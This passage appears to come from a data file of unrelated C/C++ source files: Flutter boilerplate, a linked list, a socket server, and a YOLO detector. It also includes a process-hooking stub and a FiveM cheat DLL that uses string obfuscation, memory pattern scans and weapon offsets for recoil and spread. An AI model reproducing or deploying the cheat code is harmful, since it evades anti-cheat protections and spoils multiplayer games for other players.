= reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <cassert>\n#include <cstdlib>\n#include <cstdio>\n\n#include \"list.h\"\n\nstatic ListErrors VerifyFullList (List* list);\nstatic void RecFreeNodes (List* list, int cur_index);\n\n#define FULL_LIST_VERIFY(list) \\\n    if ((VerifyFullList (list)) == LIST_IS_FULL) return LIST_IS_FULL;\n\nvoid ListCtor (List* list, int capacity)\n{\n    assert (list);\n\n    list->nodes = (Node*) calloc (capacity, sizeof (Node));\n    assert (list->nodes);\n\n    list->capacity = capacity;\n\n    for (int i = 1; i < capacity - 1; i++)\n    {\n        list->nodes[i].next  = i + 1;\n        list->nodes[i].prev  = PREV_FOR_FREE;\n        list->nodes[i].value = POIZON;\n    }\n\n    list->nodes[FICT_ELEM].next = FICT_ELEM;\n    list->nodes[FICT_ELEM].prev = FICT_ELEM;\n\n    list->nodes[capacity - 1].next  = FICT_ELEM;\n    list->nodes[capacity - 1].prev  = PREV_FOR_FREE;\n    list->nodes[capacity - 1].value = POIZON;\n\n    list->head = FICT_ELEM;\n    list->tail = FICT_ELEM;\n    list->free = 1;\n    list->linear = true;\n}\n\nListErrors InsertHead (List* list, elem_t value)\n{\n    assert (list);\n\n    FULL_LIST_VERIFY(list)\n\n    int free_elem_id = list->free;\n    list->free = list->nodes[list->free].next;\n\n    list->nodes[list->head].prev = free_elem_id;\n\n    list->nodes[free_elem_id].value = value;\n    list->nodes[free_elem_id].next  = list->head;\n    list->nodes[free_elem_id].prev  = FICT_ELEM;\n    list->head = free_elem_id;\n\n    if (list->size == 0)\n    {\n        list->tail = free_elem_id;\n    }\n    else\n    {\n        list->linear = false;\n    }\n\n    list->size++;\n\n    return NO_LIST_ERROR;\n}\n\nListErrors InsertTail (List* list, elem_t value)\n{\n    assert (list);\n\n    FULL_LIST_VERIFY(list)\n\n    int free_elem_id = list->free;\n    list->free = list->nodes[list->free].next;\n\n    list->nodes[list->tail].next = free_elem_id;\n\n    list->nodes[free_elem_id].value = value;\n    list->nodes[free_elem_id].prev  = list->tail;\n    list->nodes[free_elem_id].next  = FICT_ELEM;\n    list->tail = free_elem_id;\n\n    if (list->size == 0)\n    {\n        list->head = free_elem_id;\n    }\n\n    list->size++;\n\n    return NO_LIST_ERROR;\n}\n\nListErrors InsertAfter (List* list, elem_t value, int position)\n{\n    assert (list);\n\n    FULL_LIST_VERIFY(list)\n\n    if (position == list->tail) return InsertTail (list, value);\n\n    if (position >= list->capacity)\n    {\n        printf (\"Position is bigger than capacity!\\n\");\n\n        return POS_BIGGER_THAN_CAPACITY;\n    }\n\n    int free_elem_id = list->free;\n    list->free = list->nodes[list->free].next;\n\n    int after_position_id = list->nodes[position].next;\n    list->nodes[position].next = free_elem_id;\n    list->nodes[after_position_id].prev = free_elem_id;\n\n    list->nodes[free_elem_id].prev  = position;\n    list->nodes[free_elem_id].next  = after_position_id;\n    list->nodes[free_elem_id].value = value;\n\n    list->size++;\n\n    list->linear = false;\n\n    return NO_LIST_ERROR;\n}\n\nListErrors InsertBefore (List* list, elem_t value, int position)\n{\n    assert (list);\n\n    FULL_LIST_VERIFY(list)\n\n    if (position == list->head) return InsertHead (list, value);\n\n    if (position > list->capacity)\n    {\n        printf (\"Position is bigger than capacity!\\n\");\n\n        return POS_BIGGER_THAN_CAPACITY;\n    }\n\n    return InsertAfter (list, value, list->nodes[position].prev);\n}\n\nListErrors ListDelete (List* list, int position)\n{\n    assert (list);\n\n    if (position >= list->capacity)\n    {\n        printf (\"Position is bigger than capacity!\\n\");\n\n        return POS_BIGGER_THAN_CAPACITY;\n    }\n\n    if (list->size == 0)\n    {\n        printf (\"No elements to delete\\n\");\n\n        return INVALID_POSITION_FOR_DELETE;\n    }\n\n    free ((void*) list->nodes[position].value);\n    list->nodes[position].value = POIZON;\n\n    if (position == list->head)\n    {\n        if (list->head == list->tail) // One element in list\n        {\n            list->tail = FICT_ELEM;\n            list->head = FICT_ELEM;\n        }\n        else\n        {\n            list->head = list->nodes[list->head].next;\n            list->nodes[list->head].prev = FICT_ELEM;\n            list->linear = false;\n        }\n    }\n    else if (position == list->tail)\n    {\n        list->tail = list->nodes[list->tail].prev;\n        list->nodes[list->tail].next = FICT_ELEM;\n    }\n    else\n    {\n        list->nodes[list->nodes[position].prev].next = list->nodes[position].next;\n        list->nodes[list->nodes[position].next].prev = list->nodes[position].prev;\n        list->linear = false;\n    }\n\n    int free_elem_id = list->free;\n\n    list->free = position;\n    list->nodes[list->free].prev = PREV_FOR_FREE;\n    list->nodes[list->free].next = free_elem_id;\n\n    list->size--;\n\n    return NO_LIST_ERROR;\n}\n\nListErrors ListResize (List* list, int new_capacity)\n{\n    assert (list);\n\n    if ((new_capacity <= list->capacity) || (new_capacity <= 0))\n    {\n        printf (\"Invalid new capacity!\\n\");\n\n        return INVALID_NEW_CAPACITY;\n    }\n\n    list->nodes = (Node*) realloc (list->nodes, sizeof (Node) * new_capacity);\n\n    list-",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include \"../util.h\"\n#include <strings.h>\n#include <iostream>\n#include <errno.h>\n#include <algorithm>\nnamespace SudoUno{\n\tnamespace network {\n\n        SocketServer::SocketServer(int port) {\n            // The first call has to be to socket(). This creates a UNIX socket.\n            int socketFD = socket(AF_INET, SOCK_STREAM, 0);\n            if (socketFD < 0)\n                throw std::string(\"Unable to open the socket server\");\n\n            // The second call is to bind().  This identifies the socket file\n            // descriptor with the description of the kind of socket we want to have.\n            bzero((char*)&socketDescriptor,sizeof(sockaddr_in));\n            socketDescriptor.sin_family = AF_INET;\n            socketDescriptor.sin_port = htons(port);\n            socketDescriptor.sin_addr.s_addr = INADDR_ANY;\n            if (bind(socketFD,(sockaddr*)&socketDescriptor,sizeof(socketDescriptor)) < 0)\n                throw std::string(\"Unable to bind socket to requested port\");\n\n            // Set up a maximum number of pending connections to accept\n            listen(socketFD,5);\n            SetFD(socketFD);\n            // At this point, the object is initialized.  So return.\n        }\n\n        SocketServer::~SocketServer(void)\n        {\n            Shutdown();\n        }\n\n        Socket SocketServer::Accept(void)\n        {\n            FlexWait waiter(2,this,&terminator);\n            Blockable * result = waiter.Wait();\n\n            if (result == &terminator)\n            {\n                terminator.Reset();\n                throw TerminationException(2);\n            }\n\n            if (result == this)\n            {\n                int connectionFD = accept(GetFD(),NULL,0);\n                if (connectionFD < 0)\n                {\n                    throw std::string(\"Unexpected error in the server\");\n                }\n                return Socket(connectionFD);\n            }\n            else\n                throw std::string(\"Unexpected error in the server\");\n        }\n\n        void SocketServer::Shutdown(void)\n        {\n            close(GetFD());\n            shutdown(GetFD(),SHUT_RDWR);\n            terminator.Trigger();\n        }\n    }\n};",
    "\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include \"detours.h\"\r\n#include <Winternl.h>\r\n\r\n\r\nstruct defines {\r\n\r\n    typedef BOOL(WINAPI* LPFN_CREATEPROCESSW)(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n        );\r\n\r\n\ttypedef NTSTATUS(NTAPI* LPFN_NTQUERYSYSTEMINFORMATION)(\r\n\t\tSYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n\t\tPVOID SystemInformation,\r\n\t\tULONG SystemInformationLength,\r\n\t\tPULONG ReturnLength\r\n\t\t);\r\n\r\n}; extern defines* define;\r\n\r\nstruct pointers {\r\n\r\n    HMODULE ntdll_module = GetModuleHandleA(\"ntdll.dll\");\r\n    defines::LPFN_CREATEPROCESSW CreateProcessW_pointer = CreateProcessW;\r\n    defines::LPFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation_pointer = (defines::LPFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_module, \"NtQuerySystemInformation\");;\r\n\r\n}; pointers* ptr = new pointers();\r\n\r\nstruct detoured {\r\n\r\n   static BOOL WINAPI CreateProcessW_Hook(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n    )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n  static NTSTATUS NTAPI NtQuerySystemInformation_Hook(\r\n       SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n       PVOID SystemInformation,\r\n       ULONG SystemInformationLength,\r\n       PULONG ReturnLength\r\n   ) \r\n   {\r\n\r\n      return FALSE;\r\n   }\r\n}; extern detoured* detours;\r\n\r\nclass anti_process\r\n{\r\n\r\npublic:\r\n\r\n    void anti_file() {\r\n        HMODULE module = GetModuleHandleA(\"kernel32.dll\");\r\n        if (module) \r\n\t{\r\n\t    ptr->CreateProcessW_pointer = (defines::LPFN_CREATEPROCESSW)GetProcAddress(module, \"CreateProcessW\");\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->CreateProcessW_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n    void anti_NTQUERY() {\r\n\r\n        HMODULE module = GetModuleHandleA(\"ntdll.dll\");\r\n        if (module)\r\n        {\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->NtQuerySystemInformation_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n\tvoid hook_process() \r\n\t{\r\n\t   DetourTransactionBegin();\r\n\t   DetourUpdateThread(GetCurrentThread());\r\n\t   DetourAttach(&(PVOID&)ptr->CreateProcessW_pointer, detours->CreateProcessW_Hook);\r\n\t   DetourTransactionCommit();\r\n\t} \r\n}; static anti_process* process = new anti_process();\r\n\r\n\r\nint main()\r\n{\r\n    process->anti_NTQUERY(); // works best.\r\n}\r\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include \"yolo.h\"\r\n#include <iostream>\r\n#include<opencv2//opencv.hpp>\r\n#include <filesystem>\r\n#include<math.h>\r\n\r\n#define USE_CUDA true //use opencv-cuda\r\n\r\nusing namespace std;\r\nusing namespace cv;\r\nusing namespace dnn;\r\nnamespace fs = std::filesystem;\r\n\r\n\r\nclass YoloApp {\r\npublic:\r\n    YoloApp(const string& modelPath, const string& folderPath, const string& outputFolder)\r\n        : modelPath_(modelPath), folderPath_(folderPath), outputFolder_(outputFolder), imageCount_(1) {}\r\n\r\n    void run() {\r\n        Yolo yolo;\r\n        Net net;\r\n\r\n        if (yolo.readModel(net, modelPath_, !USE_CUDA)) {\r\n            cout << \"Read net OK!\" << endl;\r\n        }\r\n        else {\r\n            cout << \"Read ONNX model failed!\";\r\n            return;\r\n        }\r\n\r\n        vector<Scalar> color;\r\n        srand(time(0));\r\n        for (int i = 0; i < 80; i++) {\r\n            int b = rand() % 256;\r\n            int g = rand() % 256;\r\n            int r = rand() % 256;\r\n            color.push_back(Scalar(b, g, r));\r\n        }\r\n\r\n        bool continueProcessing = true;\r\n\r\n        for (const auto& entry : fs::directory_iterator(folderPath_)) {\r\n            const auto& filePath = entry.path();\r\n            if (fs::is_regular_file(filePath) &&\r\n                (filePath.extension() == \".jpg\" || filePath.extension() == \".png\" || filePath.extension() == \".jpeg\")) {\r\n                Mat img = imread(filePath.string());\r\n\r\n                processImage(img, yolo, net, color);\r\n\r\n                cout << \"Press Enter to continue, Esc to exit, or any other key to display the prompt.\" << endl;\r\n                char key = waitKey(0);\r\n\r\n                if (key == 27) {  // 27 corresponds to the ASCII value of Esc key\r\n                    continueProcessing = false;\r\n                    break;\r\n                }\r\n                else if (key != 13) {  // 13 corresponds to the ASCII value of Enter key\r\n                    cout << \"Press Enter to continue, Esc to exit.\" << endl;\r\n                    key = waitKey(0);\r\n                    if (key == 27) {\r\n                        continueProcessing = false;\r\n                        break;\r\n                    }\r\n                }\r\n            }\r\n\r\n            if (!continueProcessing) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\nprivate:\r\n    void processImage(Mat& img, Yolo& yolo, Net& net, const vector<Scalar>& color) {\r\n        vector<Output> result;\r\n\r\n        if (yolo.Detect(img, net, result)) {\r\n            yolo.drawPred(img, result, color);\r\n\r\n            // Save the processed image\r\n            string outputPath = outputFolder_ + \"/\" + to_string(imageCount_) + \".jpg\";\r\n            imwrite(outputPath, img);\r\n            cout << \"Saved: \" << outputPath << endl;\r\n            imageCount_++;\r\n        }\r\n        else {\r\n            cout << \"Detect failed for image!\" << endl;\r\n        }\r\n\r\n        namedWindow(\"Result of Detection\", WINDOW_NORMAL);  // Create a resizable window\r\n        imshow(\"Result of Detection\", img);\r\n        //destroyAllWindows(); // Close all previously created windows\r\n    }\r\n\r\nprivate:\r\n    string modelPath_;\r\n    string folderPath_;\r\n    string outputFolder_;\r\n    int imageCount_;\r\n};\r\n\r\nint main() {\r\n#if (defined YOLOV5 && YOLOV5 == true)\r\n    string model_path = \"./models/yolov5n.onnx\";\r\n#else\r\n    string model_path = \"./models/best.onnx\";\r\n#endif\r\n\r\n    string folder_path = \"./images2\"; // Change this to the path of your image folder\r\n\r\n    string output_folder = \"./output_images\"; // Change this to the path where you want to save the processed images\r\n\r\n    // Create the output folder if it doesn't exist\r\n    fs::create_directory(output_folder);\r\n\r\n    YoloApp yoloApp(model_path, folder_path, output_folder);\r\n    yoloApp.run();\r\n    return 0;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return 